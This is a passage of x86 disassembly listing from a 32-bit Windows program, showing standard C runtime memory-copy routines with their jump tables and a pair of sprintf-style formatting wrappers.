  404867:	00 7c 48 40          	add    %bh,0x40(%eax,%ecx,2)
  40486b:	00 88 48 40 00 9c    	add    %cl,-0x63ffbfb8(%eax)
  404871:	48                   	dec    %eax
  404872:	40                   	inc    %eax
  404873:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  404879:	c9                   	leave
  40487a:	c3                   	ret
  40487b:	90                   	nop
  40487c:	8a 06                	mov    (%esi),%al
  40487e:	88 07                	mov    %al,(%edi)
  404880:	8b 45 08             	mov    0x8(%ebp),%eax
  404883:	5e                   	pop    %esi
  404884:	5f                   	pop    %edi
  404885:	c9                   	leave
  404886:	c3                   	ret
  404887:	90                   	nop
  404888:	8a 06                	mov    (%esi),%al
  40488a:	88 07                	mov    %al,(%edi)
  40488c:	8a 46 01             	mov    0x1(%esi),%al
  40488f:	88 47 01             	mov    %al,0x1(%edi)
  404892:	8b 45 08             	mov    0x8(%ebp),%eax
  404895:	5e                   	pop    %esi
  404896:	5f                   	pop    %edi
  404897:	c9                   	leave
  404898:	c3                   	ret
  404899:	8d 49 00             	lea    0x0(%ecx),%ecx
  40489c:	8a 06                	mov    (%esi),%al
  40489e:	88 07                	mov    %al,(%edi)
  4048a0:	8a 46 01             	mov    0x1(%esi),%al
  4048a3:	88 47 01             	mov    %al,0x1(%edi)
  4048a6:	8a 46 02             	mov    0x2(%esi),%al
  4048a9:	88 47 02             	mov    %al,0x2(%edi)
  4048ac:	8b 45 08             	mov    0x8(%ebp),%eax
  4048af:	5e                   	pop    %esi
  4048b0:	5f                   	pop    %edi
  4048b1:	c9                   	leave
  4048b2:	c3                   	ret
  4048b3:	90                   	nop
  4048b4:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  4048b8:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  4048bc:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4048c2:	75 24                	jne    0x4048e8
  4048c4:	c1 e9 02             	shr    $0x2,%ecx
  4048c7:	83 e2 03             	and    $0x3,%edx
  4048ca:	83 f9 08             	cmp    $0x8,%ecx
  4048cd:	72 0d                	jb     0x4048dc
  4048cf:	fd                   	std
  4048d0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4048d2:	fc                   	cld
  4048d3:	ff 24 95 00 4a 40 00 	jmp    *0x404a00(,%edx,4)
  4048da:	8b ff                	mov    %edi,%edi
  4048dc:	f7 d9                	neg    %ecx
  4048de:	ff 24 8d b0 49 40 00 	jmp    *0x4049b0(,%ecx,4)
  4048e5:	8d 49 00             	lea    0x0(%ecx),%ecx
  4048e8:	8b c7                	mov    %edi,%eax
  4048ea:	ba 03 00 00 00       	mov    $0x3,%edx
  4048ef:	83 f9 04             	cmp    $0x4,%ecx
  4048f2:	72 0c                	jb     0x404900
  4048f4:	83 e0 03             	and    $0x3,%eax
  4048f7:	2b c8                	sub    %eax,%ecx
  4048f9:	ff 24 85 04 49 40 00 	jmp    *0x404904(,%eax,4)
  404900:	ff 24 8d 00 4a 40 00 	jmp    *0x404a00(,%ecx,4)
  404907:	90                   	nop
  404908:	14 49                	adc    $0x49,%al
  40490a:	40                   	inc    %eax
  40490b:	00 38                	add    %bh,(%eax)
  40490d:	49                   	dec    %ecx
  40490e:	40                   	inc    %eax
  40490f:	00 60 49             	add    %ah,0x49(%eax)
  404912:	40                   	inc    %eax
  404913:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  404919:	88 47 03             	mov    %al,0x3(%edi)
  40491c:	83 ee 01             	sub    $0x1,%esi
  40491f:	c1 e9 02             	shr    $0x2,%ecx
  404922:	83 ef 01             	sub    $0x1,%edi
  404925:	83 f9 08             	cmp    $0x8,%ecx
  404928:	72 b2                	jb     0x4048dc
  40492a:	fd                   	std
  40492b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40492d:	fc                   	cld
  40492e:	ff 24 95 00 4a 40 00 	jmp    *0x404a00(,%edx,4)
  404935:	8d 49 00             	lea    0x0(%ecx),%ecx
  404938:	8a 46 03             	mov    0x3(%esi),%al
  40493b:	23 d1                	and    %ecx,%edx
  40493d:	88 47 03             	mov    %al,0x3(%edi)
  404940:	8a 46 02             	mov    0x2(%esi),%al
  404943:	c1 e9 02             	shr    $0x2,%ecx
  404946:	88 47 02             	mov    %al,0x2(%edi)
  404949:	83 ee 02             	sub    $0x2,%esi
  40494c:	83 ef 02             	sub    $0x2,%edi
  40494f:	83 f9 08             	cmp    $0x8,%ecx
  404952:	72 88                	jb     0x4048dc
  404954:	fd                   	std
  404955:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404957:	fc                   	cld
  404958:	ff 24 95 00 4a 40 00 	jmp    *0x404a00(,%edx,4)
  40495f:	90                   	nop
  404960:	8a 46 03             	mov    0x3(%esi),%al
  404963:	23 d1                	and    %ecx,%edx
  404965:	88 47 03             	mov    %al,0x3(%edi)
  404968:	8a 46 02             	mov    0x2(%esi),%al
  40496b:	88 47 02             	mov    %al,0x2(%edi)
  40496e:	8a 46 01             	mov    0x1(%esi),%al
  404971:	c1 e9 02             	shr    $0x2,%ecx
  404974:	88 47 01             	mov    %al,0x1(%edi)
  404977:	83 ee 03             	sub    $0x3,%esi
  40497a:	83 ef 03             	sub    $0x3,%edi
  40497d:	83 f9 08             	cmp    $0x8,%ecx
  404980:	0f 82 56 ff ff ff    	jb     0x4048dc
  404986:	fd                   	std
  404987:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404989:	fc                   	cld
  40498a:	ff 24 95 00 4a 40 00 	jmp    *0x404a00(,%edx,4)
  404991:	8d 49 00             	lea    0x0(%ecx),%ecx
  404994:	b4 49                	mov    $0x49,%ah
  404996:	40                   	inc    %eax
  404997:	00 bc 49 40 00 c4 49 	add    %bh,0x49c40040(%ecx,%ecx,2)
  40499e:	40                   	inc    %eax
  40499f:	00 cc                	add    %cl,%ah
  4049a1:	49                   	dec    %ecx
  4049a2:	40                   	inc    %eax
  4049a3:	00 d4                	add    %dl,%ah
  4049a5:	49                   	dec    %ecx
  4049a6:	40                   	inc    %eax
  4049a7:	00 dc                	add    %bl,%ah
  4049a9:	49                   	dec    %ecx
  4049aa:	40                   	inc    %eax
  4049ab:	00 e4                	add    %ah,%ah
  4049ad:	49                   	dec    %ecx
  4049ae:	40                   	inc    %eax
  4049af:	00 f7                	add    %dh,%bh
  4049b1:	49                   	dec    %ecx
  4049b2:	40                   	inc    %eax
  4049b3:	00 8b 44 8e 1c 89    	add    %cl,-0x76e371bc(%ebx)
  4049b9:	44                   	inc    %esp
  4049ba:	8f                   	(bad)
  4049bb:	1c 8b                	sbb    $0x8b,%al
  4049bd:	44                   	inc    %esp
  4049be:	8e 18                	mov    (%eax),%ds
  4049c0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  4049c4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  4049c8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  4049cc:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  4049d0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  4049d4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  4049d8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  4049dc:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  4049e0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  4049e4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  4049e8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  4049ec:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  4049f3:	03 f0                	add    %eax,%esi
  4049f5:	03 f8                	add    %eax,%edi
  4049f7:	ff 24 95 00 4a 40 00 	jmp    *0x404a00(,%edx,4)
  4049fe:	8b ff                	mov    %edi,%edi
  404a00:	10 4a 40             	adc    %cl,0x40(%edx)
  404a03:	00 18                	add    %bl,(%eax)
  404a05:	4a                   	dec    %edx
  404a06:	40                   	inc    %eax
  404a07:	00 28                	add    %ch,(%eax)
  404a09:	4a                   	dec    %edx
  404a0a:	40                   	inc    %eax
  404a0b:	00 3c 4a             	add    %bh,(%edx,%ecx,2)
  404a0e:	40                   	inc    %eax
  404a0f:	00 8b 45 08 5e 5f    	add    %cl,0x5f5e0845(%ebx)
  404a15:	c9                   	leave
  404a16:	c3                   	ret
  404a17:	90                   	nop
  404a18:	8a 46 03             	mov    0x3(%esi),%al
  404a1b:	88 47 03             	mov    %al,0x3(%edi)
  404a1e:	8b 45 08             	mov    0x8(%ebp),%eax
  404a21:	5e                   	pop    %esi
  404a22:	5f                   	pop    %edi
  404a23:	c9                   	leave
  404a24:	c3                   	ret
  404a25:	8d 49 00             	lea    0x0(%ecx),%ecx
  404a28:	8a 46 03             	mov    0x3(%esi),%al
  404a2b:	88 47 03             	mov    %al,0x3(%edi)
  404a2e:	8a 46 02             	mov    0x2(%esi),%al
  404a31:	88 47 02             	mov    %al,0x2(%edi)
  404a34:	8b 45 08             	mov    0x8(%ebp),%eax
  404a37:	5e                   	pop    %esi
  404a38:	5f                   	pop    %edi
  404a39:	c9                   	leave
  404a3a:	c3                   	ret
  404a3b:	90                   	nop
  404a3c:	8a 46 03             	mov    0x3(%esi),%al
  404a3f:	88 47 03             	mov    %al,0x3(%edi)
  404a42:	8a 46 02             	mov    0x2(%esi),%al
  404a45:	88 47 02             	mov    %al,0x2(%edi)
  404a48:	8a 46 01             	mov    0x1(%esi),%al
  404a4b:	88 47 01             	mov    %al,0x1(%edi)
  404a4e:	8b 45 08             	mov    0x8(%ebp),%eax
  404a51:	5e                   	pop    %esi
  404a52:	5f                   	pop    %edi
  404a53:	c9                   	leave
  404a54:	c3                   	ret
  404a55:	8b ff                	mov    %edi,%edi
  404a57:	55                   	push   %ebp
  404a58:	8b ec                	mov    %esp,%ebp
  404a5a:	83 ec 20             	sub    $0x20,%esp
  404a5d:	53                   	push   %ebx
  404a5e:	33 db                	xor    %ebx,%ebx
  404a60:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  404a63:	75 1d                	jne    0x404a82
  404a65:	e8 1f 2a 00 00       	call   0x407489
  404a6a:	53                   	push   %ebx
  404a6b:	53                   	push   %ebx
  404a6c:	53                   	push   %ebx
  404a6d:	53                   	push   %ebx
  404a6e:	53                   	push   %ebx
  404a6f:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  404a75:	e8 dd 63 00 00       	call   0x40ae57
  404a7a:	83 c4 14             	add    $0x14,%esp
  404a7d:	83 c8 ff             	or     $0xffffffff,%eax
  404a80:	eb 4d                	jmp    0x404acf
  404a82:	8b 45 08             	mov    0x8(%ebp),%eax
  404a85:	3b c3                	cmp    %ebx,%eax
  404a87:	74 dc                	je     0x404a65
  404a89:	56                   	push   %esi
  404a8a:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404a8d:	89 45 e0             	mov    %eax,-0x20(%ebp)
  404a90:	8d 45 10             	lea    0x10(%ebp),%eax
  404a93:	50                   	push   %eax
  404a94:	53                   	push   %ebx
  404a95:	ff 75 0c             	push   0xc(%ebp)
  404a98:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404a9b:	50                   	push   %eax
  404a9c:	c7 45 e4 ff ff ff 7f 	movl   $0x7fffffff,-0x1c(%ebp)
  404aa3:	c7 45 ec 42 00 00 00 	movl   $0x42,-0x14(%ebp)
  404aaa:	e8 3d 6f 00 00       	call   0x40b9ec
  404aaf:	83 c4 10             	add    $0x10,%esp
  404ab2:	ff 4d e4             	decl   -0x1c(%ebp)
  404ab5:	8b f0                	mov    %eax,%esi
  404ab7:	78 07                	js     0x404ac0
  404ab9:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404abc:	88 18                	mov    %bl,(%eax)
  404abe:	eb 0c                	jmp    0x404acc
  404ac0:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404ac3:	50                   	push   %eax
  404ac4:	53                   	push   %ebx
  404ac5:	e8 de 6c 00 00       	call   0x40b7a8
  404aca:	59                   	pop    %ecx
  404acb:	59                   	pop    %ecx
  404acc:	8b c6                	mov    %esi,%eax
  404ace:	5e                   	pop    %esi
  404acf:	5b                   	pop    %ebx
  404ad0:	c9                   	leave
  404ad1:	c3                   	ret
  404ad2:	8b ff                	mov    %edi,%edi
  404ad4:	55                   	push   %ebp
  404ad5:	8b ec                	mov    %esp,%ebp
  404ad7:	8d 45 14             	lea    0x14(%ebp),%eax
  404ada:	50                   	push   %eax
  404adb:	ff 75 10             	push   0x10(%ebp)
  404ade:	ff 75 0c             	push   0xc(%ebp)
  404ae1:	ff 75 08             	push   0x8(%ebp)
  404ae4:	e8 9b 7a 00 00       	call   0x40c584
  404ae9:	83 c4 10             	add    $0x10,%esp
  404aec:	5d                   	pop    %ebp
  404aed:	c3                   	ret
